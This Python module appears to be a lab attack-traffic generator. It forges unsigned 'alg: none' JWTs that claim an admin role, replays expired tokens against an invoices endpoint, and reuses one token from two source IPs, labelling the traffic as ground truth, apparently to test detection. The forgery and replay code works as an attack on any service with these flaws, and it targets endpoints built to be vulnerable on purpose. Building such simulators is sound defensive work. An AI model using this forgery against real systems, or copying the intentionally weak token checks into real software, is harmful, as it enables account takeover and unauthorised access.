"""JWT_Simulator: alg=none tampering, expired-token replay, multi-ASN JTI hijack.

Three techniques, each with a configurable count (Req 7.1, 7.2, 7.3):

* ``alg-none``:   a token with header ``alg: none`` and an empty signature
  segment, sent to ``/api/v1/admin/audit`` (the one endpoint that trusts
  unsigned claims by design).
* ``expired``:    a validly-signed token whose ``exp`` is already at least
  60 s in the past, replayed against the invoices endpoint (which accepts
  expired tokens by design).
* ``hijack``:     a single valid token reused from two source IPs in
  different ASNs (``198.51.100.10`` / ASN 64497 and ``203.0.113.10`` / ASN
  64498), with every request of the technique sent within one 60 s window.

``--mode`` only selects pacing: ``noisy`` sends each technique's requests
back-to-back, ``low-and-slow`` spaces them out. The hijack technique always
finishes inside its 60 s budget regardless of mode. A 10 s request timeout
counts as failed and the run continues (Req 7.9). The completion summary
prints sent and failed counts per technique, with 0 for any technique that
sent no requests (Req 7.8).
"""
from __future__ import annotations

import argparse
import sys
import time
import uuid
from dataclasses import dataclass, field
from typing import Callable

import httpx

from app import auth
from labcommon import params
from simulators.common import GroundTruth, SimClient, add_common_args

SCENARIO = "jwt"
ADMIN_AUDIT_PATH = "/api/v1/admin/audit"
INVOICE_PATH = "/api/v1/invoices/{invoice_id}"
REPLAY_INVOICE_ID = 1001
REQUEST_TIMEOUT_S = 10.0
HIJACK_WINDOW_S = 60.0
EXPIRED_SKEW_S = 61  # strictly more than the 60 s minimum required by Req 7.2

# Two source IPs in distinct ASNs (config/ip_enrichment.yaml: 64497, 64498).
HIJACK_SOURCE_IPS = ("198.51.100.10", "203.0.113.10")

TECHNIQUES = ("alg_none", "expired", "hijack")


@dataclass
class TechniqueResult:
    sent: int = 0
    failed: int = 0


@dataclass
class JwtAbuseReport:
    results: dict[str, TechniqueResult] = field(
        default_factory=lambda: {t: TechniqueResult() for t in TECHNIQUES}
    )

    def record(self, technique: str, ok: bool) -> None:
        r = self.results[technique]
        r.sent += 1
        if not ok:
            r.failed += 1

    def print_summary(self, out=sys.stdout) -> None:
        print("JWT abuse simulation complete:", file=out)
        for name in TECHNIQUES:
            r = self.results[name]
            print(f"  {name}: sent={r.sent} failed={r.failed}", file=out)


def _forged_alg_none_token(claims: dict) -> str:
    """Header alg=none, empty signature segment (Req 7.1)."""
    header = auth._b64e(b'{"alg":"none","typ":"JWT"}')
    payload = auth._b64e(__import__("json").dumps(claims, separators=(",", ":")).encode())
    return f"{header}.{payload}."


def _expired_token(user: dict, now: float | None = None) -> str:
    """A validly-signed token whose exp is already > 60 s in the past (Req 7.2)."""
    ts = int(time.time() if now is None else now)
    iat = ts - auth.TOKEN_TTL_SECONDS - EXPIRED_SKEW_S
    return auth.encode_token({
        "sub": user["id"],
        "tenant_id": user["tenant_id"],
        "role": user["role"],
        "jti": str(uuid.uuid4()),
        "iat": iat,
        "exp": iat + auth.TOKEN_TTL_SECONDS,
    })


def _send(client: SimClient, path: str, token: str, source_ip: str, technique: str,
          report: JwtAbuseReport) -> None:
    try:
        client.request("GET", path, token=token, source_ip=source_ip, technique=technique)
        report.record(technique, ok=True)
    except (httpx.TimeoutException, httpx.TransportError):
        report.record(technique, ok=False)


def run_alg_none(client: SimClient, count: int, report: JwtAbuseReport,
                  pace: Callable[[], None], user: dict) -> None:
    for _ in range(count):
        claims = {
            "sub": user["id"], "tenant_id": user["tenant_id"], "role": "admin",
            "jti": str(uuid.uuid4()), "iat": int(time.time()),
            "exp": int(time.time()) + auth.TOKEN_TTL_SECONDS,
        }
        token = _forged_alg_none_token(claims)
        _send(client, ADMIN_AUDIT_PATH, token, HIJACK_SOURCE_IPS[0], "alg_none", report)
        pace()


def run_expired_replay(client: SimClient, count: int, report: JwtAbuseReport,
                        pace: Callable[[], None], user: dict) -> None:
    path = INVOICE_PATH.format(invoice_id=REPLAY_INVOICE_ID)
    for _ in range(count):
        token = _expired_token(user)
        _send(client, path, token, HIJACK_SOURCE_IPS[0], "expired", report)
        pace()


def run_hijack(client: SimClient, count: int, report: JwtAbuseReport, user: dict,
               sleep: Callable[[float], None]) -> None:
    """One valid token, replayed from 2 ASNs, every request inside a 60 s window."""
    path = INVOICE_PATH.format(invoice_id=REPLAY_INVOICE_ID)
    token = auth.issue_token(user)
    client.record_token(token, username=user.get("username", user["id"]), technique="hijack")
    deadline = time.monotonic() + HIJACK_WINDOW_S
    # Always alternate between the two distinct-ASN source IPs.
    delay = 0.0
    if count > 1:
        budget = max(0.0, deadline - time.monotonic() - 0.5)  # 0.5 s safety margin
        delay = budget / (count - 1)
    for i in range(count):
        source_ip = HIJACK_SOURCE_IPS[i % len(HIJACK_SOURCE_IPS)]
        _send(client, path, token, source_ip, "hijack", report)
        if i < count - 1:
            sleep(min(delay, max(0.0, deadline - time.monotonic())))


def _pacer(mode: str, sleep: Callable[[float], None]) -> Callable[[], None]:
    """noisy -> back-to-back; low-and-slow -> spaced out."""
    interval = 0.05 if mode == "noisy" else 1.0

    def pace() -> None:
        sleep(interval)

    return pace


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="JWT abuse simulator (alg=none, "
                                                  "expired replay, multi-ASN hijack)")
    add_common_args(parser)
    parser.add_argument("--alg-none-count", type=int, default=None,
                        help="requests for the alg=none technique (1-1000, default 5)")
    parser.add_argument("--expired-count", type=int, default=None,
                        help="requests for the expired-token replay technique (1-1000, default 5)")
    parser.add_argument("--hijack-count", type=int, default=None,
                        help="requests for the multi-ASN JTI hijack technique (2-1000, default 5)")
    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    try:
        plan = params.resolve_jwt({
            "mode": args.mode,
            "alg_none_count": args.alg_none_count,
            "expired_count": args.expired_count,
            "hijack_count": args.hijack_count,
        })
    except params.ParamError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2

    ground_truth = GroundTruth(label="attack", scenario=SCENARIO)
    try:
        client = SimClient(args.target, ground_truth)
    except SystemExit as exc:
        return exc.code or 2

    report = JwtAbuseReport()
    sleep = time.sleep
    pace = _pacer(plan.mode, sleep)

    # A single lab-seeded user suffices for all three techniques.
    user = {"id": "usr_001", "tenant_id": "tnt_001", "role": "user",
            "username": "user01@tnt001.lab"}

    try:
        run_alg_none(client, plan.alg_none_count, report, pace, user)
        run_expired_replay(client, plan.expired_count, report, pace, user)
        run_hijack(client, plan.hijack_count, report, user, sleep)
    finally:
        client.close()

    report.print_summary()
    return 0


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
